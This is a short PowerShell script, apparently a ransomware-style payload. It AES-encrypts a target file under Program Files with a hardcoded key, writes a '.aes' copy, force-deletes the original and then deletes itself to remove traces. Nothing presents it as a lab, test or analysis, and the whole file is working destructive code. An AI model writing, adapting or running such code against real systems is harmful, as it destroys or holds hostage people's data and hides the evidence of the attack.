
param (

    [string]$Path = "C:\Program Files\data_important.txt",

    [string]$KeyBase64 = "xIs9zA+U1j2/qW4b5r6t7y8u9i0o1p2a3s4d5f6g7h8=", 

    [string]$IVBase64  = "1a2b3c4d5e6f7g8h9i0j1k=="

)



try {

    if (-not (Test-Path $Path)) { throw "Target missing" }



    $Aes = [System.Security.Cryptography.Aes]::Create()

    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $Aes.Key = [System.Convert]::FromBase64String($KeyBase64)

    $Aes.IV  = [System.Convert]::FromBase64String($IVBase64)



    $Bytes = [System.IO.File]::ReadAllBytes($Path)



    $Encryptor = $Aes.CreateEncryptor()

    $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)



    $DestFile = $Path + ".aes"

    [System.IO.File]::WriteAllBytes($DestFile, $EncryptedBytes)



    Remove-Item -Path $Path -Force

    Write-Host "[+] File Encrypted: $DestFile"

    

}

catch { Write-Error $_ }

finally {

    Remove-Item -Path $MyInvocation.MyCommand.Path -Force

}
